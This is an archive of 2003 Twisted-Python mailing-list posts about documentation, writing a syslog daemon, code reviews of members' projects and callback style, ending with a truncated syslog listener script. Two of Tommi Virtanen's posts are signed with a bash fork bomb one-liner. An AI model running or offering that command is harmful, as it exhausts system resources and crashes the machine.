> sudden interest in Twisted purely for its web capabilities has caught the
> documentation a little off-guard.  I think people expect to see
> documentation a little more geared towards web developers, and instead
they
> get a bunch of docs that barely mentions web until the sixth chapter.

I've looked at and developed web-related things using Zope, implemented a
completly customized web-server based on a threaded
BaseHTTPServer-foundation, briefly looked at WebWare/SkunkWare/CherryPy and
at some point had a working web-something based on Medusa. They all fall
short in some place or another. Twisted is probably the closest I've come to
a server where I got full controll and at the same time can have a bunch of
working code to use. But as mentioned earlier, my webserver is not just
going to serve dynamic content, but also fetch alot of content from other
servers, so it's more than just a server. That's way threading/deferred are
so important, at least in my project, where there will be a lot of tasks
running inside a webserver doing jobs taking potentially along time,
fetching data from other servers, putting that data into a local database
etc.

>
> Also, Woven has been stable and well-documented for a really short period
of
> time.  It's not like it's been a year since it stabilised and was
> documented and we have nothing to show for it -- rather, it's been perhaps
3
> months, and we're just starting to see examples like Issues emerge.
>

Yes, and hopefully we'll see more very soon :-)

> Perhaps the confusion is that to fully use twisted web, you need to
> understand:
>    - Twisted basics, e.g. Deferreds and reactor.callLater
>    - Twisted Web basics, e.g. Resources
>    - Woven

Agree. But as I said earlier, Resources are pretty easy. Woven and deferreds
and reactor.callLater are completly different beasts.

> But you don't necessarily need full mastery of all that to be
productive --
> I've seen someone start with the PicturePile tutorial, and extend it to
have
> captions, nicer layout, and other things without major difficulty.  They
> didn't need Deferreds, they didn't need the reactor, and they didn't need
to
> use twisted.web.resoure.Resource directly, and so they had no problems
> building upon the parts of Woven that PicturePile demonstrated.

Yup. PicturePile has been and will be disected, ripped apart and put back
together in search of Woven-enlightenment. The problem is all the things
happening "automagically".
I need more testing to understand what is going on in the backgrounds.

> So ideally we don't need a "how to use a database in a web page", we
should
> just need "how to use a database in Twisted" and "how to use deferred
> results with Twisted Web".  [I think both of these topics are actually
> answered pretty poorly at the moment; I think I can feel another bout of
doc
> hacking coming on...]

Agree.

> > I really hope the new Twisted-community page can bring some simple, well
> > documented examples on how to do things. By the way things are going
we'll
> > probably have very good docs in a couple of months or so, but I want to
> > implement a feature-rich webserver based on Twisted now, as I've
described
> > and nagged about in my postings on this list several times.
>
> I don't see why we need a new "community" page to achieve this.  We have a
> perfectly good mailing-list and website -- if someone has a great example,
> we'll gladly use it!

The list and user-group has been very helpful and forthcoming so far, so
maybe not. The mentioning of more example-apps might have been what got me
to excited.

> > Anyway, I feel there is too much promise in the Twisted platform to let
a
> > few good examples scare alot of potential users away. I'm still working
on a
> > test-implementation of a webserver which hopefully will be easy enough
to
> > understand and deploy, extend and customize, written in a Twisted-way.
>
> What do you mean by "implementation"?  Have you seen Moshe Zadka's
> twisted-web Debian package that's being developed?

Eh ... no. All of my projects must run on both Linux and Windows, but if
there's a web-project based on Twisted anywhere I haven't seen allready I'm
very interested.

>
> > Anyway, I'm going to ask again; any example, small and simple, showing
how
> > to implement a webserver serving static content *and* dynamic pages, not
> > static pages like Issues or Bannerfish, using woven-forms and
> > user-authentication, in a Twisted-compatible manner would be
appreciated. If
> > I'm the only one feeling this way, I'll shut up, dive into the docs
again,
> > try some more and keep silent while doing so. Hopefully I'll be able to
> > learn Twisted and contribute something, not just nag, to a dedicated
group
> > of developers.
>
> There's no need to shut up -- if you're confused or unsure how to do
> something, then ask on the list and/or IRC.  I'd like to think we do a
> fairly good job at helping, and conversations on the list can and do lead
to
> improvements in the docs.
>
> -Andrew.

Thanks a million.

Thomas




From 2002 at weholt.org  Thu Jul 10 05:32:53 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Thu, 10 Jul 2003 11:32:53 +0200
Subject: [Twisted-Python] Implementing a syslog-deamon ??
Message-ID: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>

Hi,

I was wondering if I could implement a fully syslog-compatible
syslog-deamon/server using Twisted? We need a syslog up and running as soon
as possible to let our firewall use it, due to some suspicion about hacking
etc. It would help alot of I could implement a syslog-deamon that put data
sent to it into a database, instead of to a file. The server must be able to
run on Windows.

This would also be a perfect oppertunity to show of Python, open-source and
Twisted to a group of people who adore Microsoft and Borland and think
python and all other scripting-languages are for kids and trivial,
non-critical things.

Anyway, any hint you can give me will be appreciated.

Best regards,
Thomas




From m at moshez.org  Thu Jul 10 05:48:33 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 09:48:33 -0000
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>
Message-ID: <20030710094833.8146.qmail@green.zadka.com>

On Thu, 10 Jul 2003, "Thomas Weholt \( PRIVAT \)" <2002 at weholt.org> wrote:

> I was wondering if I could implement a fully syslog-compatible
> syslog-deamon/server using Twisted?

Yes it is. Writing a syslog is not extremely hard.
[Note that it will probably constrain your mounting order, since syslog
has to start pretty soon. OTOH, putting /usr/ on a different partition
than / is an obsolete idea, so that shouldn't be a big problem.]

> We need a syslog up and running as soon
> as possible to let our firewall use it, due to some suspicion about hacking
> etc.

"As soon as possible" and "implement my own" are usually at odds.

> It would help alot of I could implement a syslog-deamon that put data
> sent to it into a database, instead of to a file. The server must be able to
> run on Windows.

Why? What in syslog logs to a a syslog daemon? More importantly, syslog
relies on unix-specific APIs, IIRC, like named pipes or unix domain pipes.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From nbm at mithrandr.moria.org  Thu Jul 10 05:55:11 2003
From: nbm at mithrandr.moria.org (Neil Blakey-Milner)
Date: Thu, 10 Jul 2003 11:55:11 +0200
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710090455.6350.qmail@green.zadka.com>
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com>
Message-ID: <20030710095510.GB92306@mithrandr.moria.org>

On Thu 2003-07-10 (09:04), Moshe Zadka wrote:
> On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:
> 
> > I've tried to do my part in writing things like bannergrab, stikiwiki,
> > and tnntprss, but I really have no idea if they're good examples of how
> > to write things, so I can't really punt them.
> 
> It's fairly simple to find out: put them up on the web, announce them
> here. You will likely get more commentary than you ever wanted and
> will possibly lead to better docs [so we can prevent people from
> making the same mistakes] and better code [if we find out our interfaces
> don't suit the way people actually use stuff]. It would also, if you
> actually read comments and act on them, lead to an improvement of
> your examples.

(and the trap is sprung...)

Bannergrab is at http://mithrandr.moria.org/code/bannergrab/ and it is
a simple SSH/SMTP banner grabber over a (bunch of) network range(s).
Not much I'd like done with it, but suggestions on what is good/bad
about it would be nice.  Also, a "so many concurrent clients" manager
like I used might be useful in general - what do others think?

Stikiwiki (which I've mentioned here before) is at
http://mithrandr.moria.org/code/stikiwiki/ and is a pretty featureless
Wiki-alike that uses docutils for backing format in a cog database.  I'd
be really interested in how Woven can work for me, especially refreshing
content after a POST that changes the content and/or doing a redirect
and so forth.  An example of newcred/woven.guard working against a
simple "user: password" style file or a simple "user":"password"
dictionary (ie, dealing with the perspective without storing perspective
information in the authentication backend) would be very useful to
people wanting to authenticate against existing databases or libraries
(like vpopmail).

tnntprss is at http://mithrandr.moria.org/code/tnntprss/ and it creates
a NNTP news server with newsgroups and content from RSS feeds.
Configuration of RSS feeds is probably the main issue here - I didn't
want to use web interfaces without understanding woven.guard/cred
better.  Understanding whether I'm using getServiceNamed in an
acceptable way would be nice.  I remember pynfo used adapters for
something similar - would that be more Twistedish (Twistedic?).

Neil
-- 
Neil Blakey-Milner
nbm at mithrandr.moria.org



From m at moshez.org  Thu Jul 10 08:00:20 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 12:00:20 -0000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710095510.GB92306@mithrandr.moria.org>
References: <20030710095510.GB92306@mithrandr.moria.org>, <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com>
Message-ID: <20030710120020.10507.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:

> tnntprss is at http://mithrandr.moria.org/code/tnntprss/ and it creates
> a NNTP news server with newsgroups and content from RSS feeds.
> Configuration of RSS feeds is probably the main issue here - I didn't
> want to use web interfaces without understanding woven.guard/cred
> better.  Understanding whether I'm using getServiceNamed in an
> acceptable way would be nice.  I remember pynfo used adapters for
> something similar - would that be more Twistedish (Twistedic?).

Well, if you have two services that rely on each other, a nice way to
deal with that is MultiService. Have a convenicence function which
returns a MultiService, all loaded up with both services, created
from arguments to this function.

def getTNNTPService(newsDir, syndDir, name):
    s = app.MultiService(name)
    NewsService(newsDir, "news", s) 
    SyndicationService(syndDir, "syndication", s) 
    return s

Then a user can use the following to run your code:

'''
# File: tnntp.tpy
#
# Location of news
newsDir = "/tmp/newsdb"
# Location of syndication
syndDir = "/tmp/synddb"

from tnntprss import getTNNTPService
from twisted.internetet import app

application = app.Application("tnntprss")
getTNNTPService(newsDir, syndDir, "tnntp).setServiceParent(application)
'''

Then,

% twistd -y tnntp.tpy

works.

Or, you might want to support an even more extreme method of hiding
implementation details from users:

def simpGetTNNTPService(storage, name):
    s = app.MultiService(name)
    NewsService(os.path.join(storage, "newsdb"), "news", s) 
    SyndicationService(os.path.join(storage, "synddb"), "syndication", s) 
    return s

And have config files that look like

'''
# File: tnntp2.tpy
#
# Location of internal storage
storage = "/var/lib/tnntp"

from tnntprss import simpGetTNNTPService
from twisted.internetet import app

application = app.Application("tnntprss")
simpGetTNNTPService(storage, "tnntp").setServiceParent(application)
'''

And again

% twistd -y tnntp2.tpy

works.

Another thing you can do when you convert to a package [and you should,
regardless!] is to supply tap plugins that would look like

# tnntprss/tap.py
from twisted.python import usage
from tnntprss import simpGetTNNTPService

class Options(usage.Options):

    optParameters = [['storage', 's', '/var/lib/tnntp', "Where to store files"]]

def updateApplication(application, config):
    simpGetTNNTPService(config['storage'], "tnntp"
    ).setServiceParent(application)

and then put a file like

# tntprss/plugins.tml
register("TNNTPRss", "tnntprss.tap", type='tap', tapname='tnntprss')

So that the user can

% mktap tnntprss --storage=/home/moshez/.temp
% twistd -f tnntprss.tap

Other remarks:

* startScheduler should be called from startService, not __init__, to
  support persistence
* similarily, all reactor.callLater() results should be saved from
  an attribute of the SyndicationService, which is then .cancelled()
  in stopService
* 9119 is a hardcoded number. Probably should be given in an argument
  to news service. Of course, the above get...Service() calls should
  be modified to accept that argument, blah blah blah.
* I'd prefer it if .listenTCP was not called from __init__, but instead,
  an easy way to get the right factory was supplied:

class NewsService(...):
    ...
    def getFactory(self):
        return news.UsenetServerFactory(self.backend, None)

Then, in the configurator:

s = simpGetTNNTPService(storage, "tnntp")
s.setServiceParent(application)
application.listenTCP(119, s.getServiceNamed("news").getFactory())
[and again, mutatis mutandis for the other options]

Rationale: easier support for non-common listening options [what if you
want to only listen on 127.0.0.1, so that only you can read the news?
what if you wanted to listen on several ports to defeat firewalls?]

* Nit: rssparser.py is a DOS file, all other are unix files.

I hope that matches your expectations of how thoroughly we can pick
on you :)
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From nbm at mithrandr.moria.org  Thu Jul 10 08:24:02 2003
From: nbm at mithrandr.moria.org (Neil Blakey-Milner)
Date: Thu, 10 Jul 2003 14:24:02 +0200
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710120020.10507.qmail@green.zadka.com>
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com> <20030710120020.10507.qmail@green.zadka.com>
Message-ID: <20030710122402.GA10423@mithrandr.moria.org>

On Thu 2003-07-10 (12:00), Moshe Zadka wrote:
> Well, if you have two services that rely on each other, a nice way to
> deal with that is MultiService. Have a convenicence function which
> returns a MultiService, all loaded up with both services, created
> from arguments to this function.
...

> Or, you might want to support an even more extreme method of hiding
> implementation details from users:

...

> Another thing you can do when you convert to a package [and you should,
> regardless!] is to supply tap plugins that would look like

...

> Other remarks:
> 
> * startScheduler should be called from startService, not __init__, to
>   support persistence
> * similarily, all reactor.callLater() results should be saved from
>   an attribute of the SyndicationService, which is then .cancelled()
>   in stopService
> * 9119 is a hardcoded number. Probably should be given in an argument
>   to news service. Of course, the above get...Service() calls should
>   be modified to accept that argument, blah blah blah.
> * I'd prefer it if .listenTCP was not called from __init__, but instead,
>   an easy way to get the right factory was supplied:

...

> Rationale: easier support for non-common listening options [what if you
> want to only listen on 127.0.0.1, so that only you can read the news?
> what if you wanted to listen on several ports to defeat firewalls?]
> 
> I hope that matches your expectations of how thoroughly we can pick
> on you :)

More, more!

Thanks for the critique - I'll try apply this as I'm able to and get
back to everyone once I have an updated version.  I'll also see about
codifying your suggestions and having a before-and-after type document
with real examples.

(Offer time-permittingly open to others if they critique or suggest
stuff that's generally considered good advice.)

Thanks,

Neil
-- 
Neil Blakey-Milner
nbm at mithrandr.moria.org



From m at moshez.org  Thu Jul 10 08:28:45 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 12:28:45 -0000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710095510.GB92306@mithrandr.moria.org>
References: <20030710095510.GB92306@mithrandr.moria.org>, <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com>
Message-ID: <20030710122845.11361.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:

> Stikiwiki (which I've mentioned here before) is at
> http://mithrandr.moria.org/code/stikiwiki/ and is a pretty featureless
> Wiki-alike that uses docutils for backing format in a cog database.  I'd
> be really interested in how Woven can work for me, especially refreshing
> content after a POST that changes the content and/or doing a redirect
> and so forth.  An example of newcred/woven.guard working against a
> simple "user: password" style file or a simple "user":"password"
> dictionary (ie, dealing with the perspective without storing perspective
> information in the authentication backend) would be very useful to
> people wanting to authenticate against existing databases or libraries
> (like vpopmail).

I can't critique most of the Woven stuff in Stikiwiki, nor the user model,
but I will not avoid several comments:

It is better if StikiService had done all the creating a StikiSite work
in startService, added a method:

    def getResource(self):
        return ss

Then, a similar scheme to the one I detailed in my last mail with
multi-services would probably allow you to do something like:

'''
s = getStikiService("/tmp/cog", "stiki")
s.setParent(application)
application.listenTCP(8080,
                       server.Site(s.getServiceNamed("stiki").getResource()))
'''

etc. etc.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Thu Jul 10 08:41:25 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 12:41:25 -0000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <20030710095510.GB92306@mithrandr.moria.org>
References: <20030710095510.GB92306@mithrandr.moria.org>, <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com>
Message-ID: <20030710124125.11536.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Neil Blakey-Milner <nbm at mithrandr.moria.org> wrote:

> Bannergrab is at http://mithrandr.moria.org/code/bannergrab/ and it is
> a simple SSH/SMTP banner grabber over a (bunch of) network range(s).
> Not much I'd like done with it, but suggestions on what is good/bad
> about it would be nice.  Also, a "so many concurrent clients" manager
> like I used might be useful in general - what do others think?

It's not that dissimilar with some code we have in mail. Unfortunately,
a bunch of that code is not that great an example code either.

You probably don't want to call reactor.stop(). Ever.
What you want is for Manager to create a deferred which is callbacked
when there are no more slaves or waiting slaves, and let someone
else call reactor.stop() if he should wish it. I'm not exactly sure
if this is the right way, of if it should be converted to an
ApplicationService -- that depends on what you want to do.

For example, I could see an excellent case for just removing the prints
in favour of saving the data and then callback'ing the deferred, and
wrapping it all in a nice function, which can be called like this:

checkHosts(('moshez.org', 25), ('moshez.org', 22)
).addCallback(util.println
).addCallback(lambda _: reactor.stop())

One nit: protocol.slashr means you are changing a class attribute.
That's probably a bad idea. It would be better to inherit:

class UnixMyProtocol(MyProtocol):
    delimiter = '\n'

and do
  if not slashr:
      slave.protocol = UnixMyProtocol
in the relevant places.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From tv at twistedmatrix.com  Thu Jul 10 10:11:19 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 10 Jul 2003 17:11:19 +0300
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <20030710094833.8146.qmail@green.zadka.com>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com>
Message-ID: <20030710141119.GA15922@lapdog>

On Thu, Jul 10, 2003 at 09:48:33AM -0000, Moshe Zadka wrote:
> Why? What in syslog logs to a a syslog daemon? More importantly, syslog
> relies on unix-specific APIs, IIRC, like named pipes or unix domain pipes.

	Umm. The syslog network protocol is just brain-dead simple
	UDP. It's trivial to run such a server on Windows.

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Thu Jul 10 10:17:32 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 10 Jul 2003 17:17:32 +0300
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030710124125.11536.qmail@green.zadka.com>
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com> <20030710124125.11536.qmail@green.zadka.com>
Message-ID: <20030710141732.GB15922@lapdog>

On Thu, Jul 10, 2003 at 12:41:25PM -0000, Moshe Zadka wrote:
> checkHosts(('moshez.org', 25), ('moshez.org', 22)
> ).addCallback(util.println
> ).addCallback(lambda _: reactor.stop())

	*vomit*

d = checkHosts(('moshez.org', 25), ('moshez.org', 22))
d.addCallback(util.println)
d.addCallback(lambda _: reactor.stop())

	anyone?

-- 
:(){ :|:&};:



From uwe at oss4u.com  Thu Jul 10 11:24:46 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Thu, 10 Jul 2003 08:24:46 -0700
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <20030710094833.8146.qmail@green.zadka.com>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com>
Message-ID: <200307100824.46462.uwe@oss4u.com>

On Thursday 10 July 2003 02:48 am, Moshe Zadka wrote:
> On Thu, 10 Jul 2003, "Thomas Weholt \( PRIVAT \)" <2002 at weholt.org> wrote:
> > I was wondering if I could implement a fully syslog-compatible
> > syslog-deamon/server using Twisted?
>
> Yes it is. Writing a syslog is not extremely hard.
> [Note that it will probably constrain your mounting order, since syslog
> has to start pretty soon. OTOH, putting /usr/ on a different partition
> than / is an obsolete idea, so that shouldn't be a big problem.]

Not an obsolete idea. Just not too commonly used anymore. Look at large 
mission critical unix deployments and you'll see the split of / /usr /var 
etc. And basically: just fill up your harddrive and see what happens. A lot 
of daemons will stop working. If you have different partitions / will still 
have room for logfiles / configfiles.

> > We need a syslog up and running as soon
> > as possible to let our firewall use it, due to some suspicion about
> > hacking etc.
>
> "As soon as possible" and "implement my own" are usually at odds.
>
> > It would help alot of I could implement a syslog-deamon that put data
> > sent to it into a database, instead of to a file. The server must be able
> > to run on Windows.
>
> Why? What in syslog logs to a a syslog daemon? More importantly, syslog
> relies on unix-specific APIs, IIRC, like named pipes or unix domain pipes.

Nothing in syslog logs to syslog (except you set it up that way). What he is 
trying to do is to receive the log from his firewall which obviously - as do 
most firewalls - provides a syslog facility to send the logs somewhere else ( 
most "out of the box" systems do that due to lack of own harddrive)



	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From m at moshez.org  Thu Jul 10 11:33:26 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 15:33:26 -0000
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030710141732.GB15922@lapdog>
References: <20030710141732.GB15922@lapdog>, <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com> <20030710124125.11536.qmail@green.zadka.com>
Message-ID: <20030710153326.18861.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Tommi Virtanen <tv at twistedmatrix.com> wrote:

> On Thu, Jul 10, 2003 at 12:41:25PM -0000, Moshe Zadka wrote:
> > checkHosts(('moshez.org', 25), ('moshez.org', 22)
> > ).addCallback(util.println
> > ).addCallback(lambda _: reactor.stop())
> 
> 	*vomit*
> 
> d = checkHosts(('moshez.org', 25), ('moshez.org', 22))
> d.addCallback(util.println)
> d.addCallback(lambda _: reactor.stop())
> 
> 	anyone?

No.
The above is the common, and correct, coding style.
It is the very reason .addCallback returns self. 
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From rdrb at 123.cl  Thu Jul 10 12:44:00 2003
From: rdrb at 123.cl (=?iso-8859-1?Q?Rita_D=EDaz_y/o_Rodrigo_Benenson?=)
Date: Thu, 10 Jul 2003 12:44:00 -0400
Subject: [Twisted-Python] Is it just me ....
References: <20030710072001.1990.59472.Mailman@pyramid.twistedmatrix.com>
Message-ID: <001801c34702$79ce5d60$4b30fea9@laboratorio>

Hi,
shortly,
I would like to say that I found the Twisted Documentation Excellent because
it is extensive, detailled, with toy code examples and step by step. It is a
lot of reading but after it you got the picture and the feelling about how
to use Twisted.
This was my impresion, and it was usefull for me; I'm develloping a
collaborative outlined text editor, and Twisted support has bee fundamental.
So I would point that the documentation style is a Plus for Twisted.

There are clear problems on the documentation updating delays, specially
Woven has some sections unfilled from various month (Guard, LivePage). Also
the list posted a change on cred but I still not viewing differences on the
web docs. Having a good doc is fine, but unusefull if it is not up to date.

So I propose to first update the docs before creating toy apps. I think,
like some of you, that the examples will come with the time as Twisted
become more and more popular (ActiveStateAwards, various webpublications,
usages in more and more comunities).

Proposal of an interesant example (I did not look it in detail but is a
potential use-everything example) http://www.fettig.net/projects/hep/

Now, on another hand, I'm a little worried about the workflow of Twisted. As
they don't use SourceForge, and I don't see any project manager software I
suppose that devellopment is driven by less than 10 people coordinating
between them via this list and by IRC. This can work fine for you
(devellopers) but does not help to have an active comunity (if you are
consultant, deploying a user comunity is one of your interests, right?).

So I propose, better than using Plone (yerk...), to define the requirements
about what could be usefull to be show to the comunity and devellop or reuse
the required code (integrating where necesarry into the TwistedWeb, not
replacing the twisted web).
The obvious first are:
- An online todo list
- A feature request space
- A bug tracker

This is extra simple to do (issues + a wiki) and could help a lot.

I hope this could help to do a better Twisted.

Twisted is great an give network software tools at a previously unknown
ratio of power vs simplicity.

RodrigoB.










From 2002 at weholt.org  Thu Jul 10 12:59:26 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Thu, 10 Jul 2003 18:59:26 +0200
Subject: [Twisted-Python] Implementing a syslog-deamon ??
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com>
Message-ID: <002b01c34704$9ef42eb0$0401a8c0@razor>

Talk about a success story!

To make a long story short; at work we needed a syslog-deamon to use with
our firewall because we got some problems with attacks and virii sending
mass-emails using our SMTP-server. To better get a grip on the log generated
by the firewall we wanted to send it to a syslog-deamon and parse the data,
possible stuff it into a database. I created a UDP/HTTP server listening on
514 for syslog data and serving current status, reports and management pages
using http/html on 8080. A small project, but it did lift some eyebrows on
some of my co-workers and they started talking about additions and new
functionality they wanted.

Now we got a webpage showing the latest activity, archives for older logs
etc.

All done in less than 30 minutes thanks to Twisted!! :-)

Best regards,
Thomas


----- Original Message -----
From: "Moshe Zadka" <m at moshez.org>
To: <twisted-python at twistedmatrix.com>
Sent: Thursday, July 10, 2003 11:48 AM
Subject: Re: [Twisted-Python] Implementing a syslog-deamon ??


> On Thu, 10 Jul 2003, "Thomas Weholt \( PRIVAT \)" <2002 at weholt.org> wrote:
>
> > I was wondering if I could implement a fully syslog-compatible
> > syslog-deamon/server using Twisted?
>
> Yes it is. Writing a syslog is not extremely hard.
> [Note that it will probably constrain your mounting order, since syslog
> has to start pretty soon. OTOH, putting /usr/ on a different partition
> than / is an obsolete idea, so that shouldn't be a big problem.]
>
> > We need a syslog up and running as soon
> > as possible to let our firewall use it, due to some suspicion about
hacking
> > etc.
>
> "As soon as possible" and "implement my own" are usually at odds.
>
> > It would help alot of I could implement a syslog-deamon that put data
> > sent to it into a database, instead of to a file. The server must be
able to
> > run on Windows.
>
> Why? What in syslog logs to a a syslog daemon? More importantly, syslog
> relies on unix-specific APIs, IIRC, like named pipes or unix domain pipes.
>
> --
> Moshe Zadka -- http://moshez.org/
> Buffy: I don't like you hanging out with someone that... short.
> Riley: Yeah, a lot of young people nowadays are experimenting with
shortness.
> Agile Programming Language -- http://www.python.org/
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From smurf at smurf.noris.de  Thu Jul 10 12:54:37 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Thu, 10 Jul 2003 18:54:37 +0200
Subject: [Twisted-Python] Re: IMAP fixes
References: <1ED4ECF91CDED24C8D012BCF2B034F130256567F@its-xchg4.massey.ac.nz> <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz> <20030710073003.GB21625@frobozz>
Message-ID: <pan.2003.07.10.16.54.35.701702@smurf.noris.de>

Hi, Andrew Bennetts wrote:

> Note that the fact Moshe's splitting was incorrect is a good sign that REs
> aren't easily readable and understandable ;)

Actually, it's a sign that translating REs into explicit code is
error-prone. This should not surprise anybody. ;-)

Personally, I'd rather use the RE version. For me it's actually easier to
read than explicit code ("bra".."cket" -- duh).

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
BOFH excuse #412:

Radial Telemetry Infiltration




From skin_pup-twisted at damnable.happypoo.com  Thu Jul 10 08:42:49 2003
From: skin_pup-twisted at damnable.happypoo.com (Skinny Puppy)
Date: Thu, 10 Jul 2003 08:42:49 -0400
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>
Message-ID: <20030710124249.GD2672@shitbomb.com>

Attached is a basic quick easy syslog listener (best name I could come up
with).  In our environment we user deamontools for all daemons and us
multilog to handle logging this is no different. 

Jeremy

Thomas Weholt ( PRIVAT ) [2002 at weholt.org] wrote:
> Hi,
> 
> I was wondering if I could implement a fully syslog-compatible
> syslog-deamon/server using Twisted? We need a syslog up and running as soon
> as possible to let our firewall use it, due to some suspicion about hacking
> etc. It would help alot of I could implement a syslog-deamon that put data
> sent to it into a database, instead of to a file. The server must be able to
> run on Windows.
> 
> This would also be a perfect oppertunity to show of Python, open-source and
> Twisted to a group of people who adore Microsoft and Borland and think
> python and all other scripting-languages are for kids and trivial,
> non-critical things.
> 
> Anyway, any hint you can give me will be appreciated.
> 
> Best regards,
> Thomas
> 
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
-------------- next part --------------
#!/usr/local/bin/pythonN)
from twisted.internet import defer, reactor, protocol, ssl
from twisted.python import usage
from OpenSSL import SSL
import sys, os.path

LOG_PRIMASK = 0x07
PRIMASK = { 
0 : "emerg", 
1 : "alert",
2 : "crit",
3 : "err",
4 : "warning",
5 : "notice",
6 : "info",
7 : "debug"
}

FACILITYMASK = {
      0  : "kern",
      1  : "user",
      2  : "mail",
      3  : "daemon",
      4  : "auth",
      5  : "syslog",
      6  : "lpr",
      7  : "news",
      8  : "uucp",
      9  : "cron",
      10 : "authpriv",
      11 : "ftp",
      12 : "ntp",
      13 : "security",
      14 : "console",
      15 : "mark",
      16 : "local0",
      17 : "local1",
      18 : "local2",
      19 : "local3",
      20 : "local4",
      21 : "local5",
      22 : "local6",
      23 : "local7",
}

def bit2string(number):
    try: return "%s.%s"%(FACILITYMASK[number>>3] , PRIMASK[number & LOG_PRIMASK])
    except: return "unknown.unknown"
        

class syslogOptions(usage.Options):
    optParameters = [['cert', 'c', './server.pem','SSL Server certificate'],
                     ['ip',   'i', None, 'IP Address to listen on']]
    def postOptions_cert(self):
        if (not self.opts['cert']) or (not os.path.isfile(self.opts['cert'])):
            raise usage.UsageError, "%s: is not a file"
    def portOptions_ip(self):
        if (not self.opts['ip']):
            raise usage.UsageError, "IP Address is required"
    
class outputUPD(protocol.DatagramProtocol):
    def datagramReceived(self, data, (ip, port)):
        if data[2] == ">":
            other = " ".join([ip, bit2string(int(data[1]))])
            sys.stdout.write(" ".join([other, data[3:], "\n"]))
        elif data[3] == ">":
            other = " ".join([ip, bit2string(int(data[1:2]))])
            sys.stdout.write(" ".join([other, data[4:], "\n"]))
        else:
            other = " ".join([ip, "unknown.unknown"])
            sys.stdout.write(" ".join([other, data, "\n"]))

class outputTCP(protocol.Protocol):
    def connectionMade(self):
        self.factory.numberConnections += 1
        if self.factory.numberConnections > self.factory.maxNumberConnections:
            self.transport.loseConnection()

    def connectionLost(self, reason):
